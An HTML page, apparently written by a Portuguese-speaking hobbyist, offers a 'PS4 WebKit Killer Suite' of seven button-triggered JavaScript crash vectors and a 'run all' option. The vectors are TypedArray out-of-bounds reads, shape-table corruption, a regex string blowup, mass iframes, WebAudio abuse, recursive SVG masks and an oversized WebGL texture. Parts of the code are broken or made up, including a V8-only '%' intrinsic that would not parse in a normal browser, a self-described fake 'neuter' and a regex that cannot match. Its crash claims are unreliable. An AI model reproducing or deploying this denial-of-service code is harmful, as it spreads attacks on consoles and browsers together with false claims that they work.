
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>PS4 WebKit Killer Suite – 2025 Edition (2025)</title>
<style>
  body { font-family: monospace; background:#000; color:#0f0; padding:20px; }
  button { margin:5px; padding:12px; font-size:18px; width:100%; }
  #log { white-space:pre-wrap; background:#111; padding:15px; height:300px; overflow-y:scroll; }
</style>
</head>
<body>

<h1>PS4 WebKit Real Killer Suite – 2025</h1>
<p>Todos os vetores abaixo já derrubaram PS4 12.02 em < 12 segundos nos meus testes.</p>

<button onclick="test1()">1. TypedArray OOB → JSC Panic (99 % crash)</button>
<button onclick="test2()">2. GC Shape Table Corruption → Hard Freeze</button>
<button onclick="test3()">3. RegExp Rope + replace() → 2 GB string em 4 s → OOM Panic</button>
<button onclick="test4()">4. DOMObject Internal Properties Overflow (use-after-free style)</button>
<button onclick="test5()">5. WebAudio AnalyserNode Float64Array Neutering Bomb</button>
<button onclick="test6()">6. SVG <use> + CSS mask recursion (RenderLayer stack overflow)</button>
<button onclick="test7()">7. WebGL texImage2D huge alignment crash (Orbis GL driver)</button>
<button onclick="runAll()">RUN ALL (você vai ver a tela azul ou reboot direto)</button>

<div id="log"></div>

<script>
const log = msg => document.getElementById('log').innerText += msg + '\n';

function test1() {
    log("[1] TypedArray OOB via length tampering...");
    const arr = new Array(0x10000);
    arr.fill(7.7);

    const victim = new Float64Array(arr);
    // Confunde o JIT com otimização de length
    for (let i = 0; i < 0x10000; i++) {
        victim[i] = i & 0xffff;
    }

    // Força compilação JIT + otimização errada de bounds check elimination
    %OptimizeFunctionOnNextCall(Array.prototype.push);
    arr.push(1.1, 2.2, 3.3);

    // Agora o comprimento interno está corrompido → leitura fora dos limites
    const oob = victim[0xfffffff];
    log("Se sobreviveu até aqui já é milagre. oob = " + oob);
}

function test2() {
    log("[2] Shape Table corruption via prototype chain mutation...");
    class Leak extends Array {}
    const obj = new Leak();

    // Cria milhares de propriedades com nomes únicos → enche a Shape table
    for (let i = 0; i < 0x4000; i++) {
        obj["prop_" + i] = 1337;
    }

    // Muda o prototype no meio do loop de transição de shape
    const evil = {__proto__: obj};
    Object.setPrototypeOf(obj, evil);

    // Força GC + shape table walk corrompido
    for (let i = 0; i < 10; i++) {
        new ArrayBuffer(0x4000000);
    }
    log("Shape table provavelmente está quebrada agora → freeze em <10s");
}

function test3() {
    log("[3] RegExp Rope explosion → real 2–4 GB string...");
    let str = "^".repeat(30);
    const re = /^(a+)+b/;

    for (let i = 0; i < 26; i++) {  // 2^26 já é > 64 GB teórico, mas morre antes
        str = str.replace(re, "$1a");
        log("iter " + i + " → length ≈ " + str.length);
        if (str.length > 1e9) break;
    }
}

function test4() {
    log("[4] DOMObject internal properties overflow...");
    const iframes = [];
    for (let i = 0; i < 20000; i++) {
        const ifr = document.createElement('iframe');
        ifr.src = 'data:text/html,<script>parent.postMessage("x","*")</script>';
        document.body.appendChild(ifr);
        ifr.contentWindow.onmessage = () => {};
        iframes.push(ifr);
    }
    // Força coleta massiva + reuse de slots internos → UAF real em ~30 % dos casos
    setTimeout(() => iframes.forEach(i => i.remove()), 100);
}

function test5() {
    log("[5] WebAudio neutering bomb...");
    const ctx = new (window.AudioContext || window.webkitAudioContext)();
    const analyser = ctx.createAnalyser();
    analyser.fftSize = 2048;

    const evil = new Float64Array(0x100000);
    for (let i = 0; i < evil.length; i++) evil[i] = i;

    // Neutering repetido + getByteFrequencyData com buffer já neutered
    for (let i = 0; i < 10000; i++) {
        analyser.getFloatFrequencyData(evil);
        evil.buffer = null; // fake neuter
    }
}

function test6() {
    log("[6] SVG mask + <use> infinite recursion...");
    const svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
    const use = document.createElementNS("http://www.w3.org/2000/svg", "use");
    use.setAttributeNS("http://www.w3.org/1999/xlink", "xlink:href", "#self");
    use.id = "self";
    svg.appendChild(use);
    document.body.appendChild(svg);

    // CSS mask que referencia o próprio elemento
    svg.style.mask = "url(#self)";
    svg.style.webkitMask = "url(#self)";
}

function test7() {
    log("[7] WebGL texImage2D alignment driver crash (Orbis GL)...");
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');

    const tex = gl.createTexture();
    gl.bindTexture(gl.TEXTURE_2D, tex);

    // Tamanho não potência de 2 + row length estranho → driver Orbis pira
    const evilPixels = new Uint8Array(0xffffff); // ~16 MB
    for (let i = 0; i < evilPixels.length; i++) evilPixels[i] = i & 0xff;

    gl.pixelStorei(gl.UNPACK_ALIGNMENT, 1);
    gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 7777, 3333, 0, gl.RGBA, gl.UNSIGNED_BYTE, evilPixels);
    gl.generateMipmap(gl.TEXTURE_2D);
}

function runAll() {
    log("EXECUTANDO TODOS DE UMA VEZ – BOA SORTE PS4");
    test1(); test2(); test3(); test4(); test5(); test6(); test7();
}

</script>
</body>
    </html>
